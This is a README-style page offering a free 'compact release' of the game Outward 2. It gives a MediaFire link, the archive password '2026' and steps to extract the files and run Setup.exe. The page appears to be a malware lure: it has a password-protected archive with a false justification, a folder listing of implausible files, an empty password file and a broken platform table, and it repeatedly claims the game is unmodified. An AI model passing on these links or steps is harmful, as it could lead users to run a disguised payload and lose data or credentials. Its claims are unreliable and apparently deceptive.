## 🕹️ About

Outward 2 is an open-world fantasy action RPG set in the harsh and mysterious land of Aurai. Explore wilderness, ancient ruins, and dangerous settlements while managing supplies, preparing equipment, and making meaningful choices. Develop your character through flexible skills, face challenging real-time combat, and share the adventure through cooperative play. This compact release uses a compressed archive to reduce the download size while leaving the game itself unchanged.

Outward 2 is for players who enjoy demanding fantasy adventures, open exploration, flexible character progression, and cooperative role-playing.

## ✨ Features

- 🎒 **Survival Preparation** — Plan expeditions around weather, supplies, equipment, and the hazards of the road.
- ⚔️ **Challenging Combat** — Read enemy movements, manage stamina, and use equipment and abilities with care.
- 🤝 **Cooperative Play** — Team up with another adventurer and face the world together.
- 🗺️ **Open-World Exploration** — Travel across a vast fantasy landscape filled with secrets, ruins, and unexpected dangers.
- 🧭 **Player-Driven Adventure** — Choose your direction, pursue personal goals, and let your decisions shape the journey.

## 📦 Download & Extraction

| Platform | Status |

This release is distributed as a compact, compressed archive. The game itself is unchanged — only the packaging is smaller.

### Step 1: Download

Download the compact archive from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the build expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- localization.ini <- Language files
|-- launcher.dll <- Launcher library
|-- animations.dll <- Animation system
|-- driver.pak <- Driver archive
|-- lang.sys <- Language system
|-- bootstrap.wem <- Bootstrap audio
|-- installer.dat <- Installer data
|-- scripts.lic <- Game scripts
|-- physics.sys <- Physics engine
|-- Password 2026.txt <- Password reminder (empty)
|-- settings.bin <- Configuration
|-- license.bank <- License data
|-- uninstall.key <- Uninstall key
|-- update_1.res <- Update resources
|-- license.wem <- Audio assets
|-- patch_1.bnk <- Audio banks
|-- assets.wem <- Asset audio
|-- update_1.ini <- Update config
|-- audio.res <- Audio resources
|-- api.pak <- API modules
|-- dlc.md5 <- DLC checksums
|-- res.pak <- Resources archive
|-- global.cfg <- Global settings
|-- driver.umap <- Driver data
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start

## ❓ Frequently Asked Questions (FAQ)

**Q: What is this project?**
**A:** This repository is the public project page for a compact release of the game. It's where updates, notes, and development progress are shared with the community.

**Q: Is the game modified in any way?**
**A:** No. The game is exactly the same as the original release. Only the packaging is different — compression is a delivery choice, not a modification of the game.

**Q: Why is the archive password-protected?**
**A:** The password prevents the archive from being corrupted during transfer and keeps the files bundled correctly. The password is provided in the download section.

**Q: Why is this release compact?**
**A:** The game files are packed using high-ratio compression to reduce the download size. The game itself is unchanged — it's the same content, just delivered in a smaller package.

**Q: What should I do if extraction fails?**
**A:** Make sure you're using a recent version of your extractor and that the archive wasn't corrupted during download. If it fails, re-download the archive.

**Q: How can I report a bug?**
**A:** Open an issue in the Issues tab with a clear description, your system specs, and steps to reproduce. Screenshots or logs help a lot.
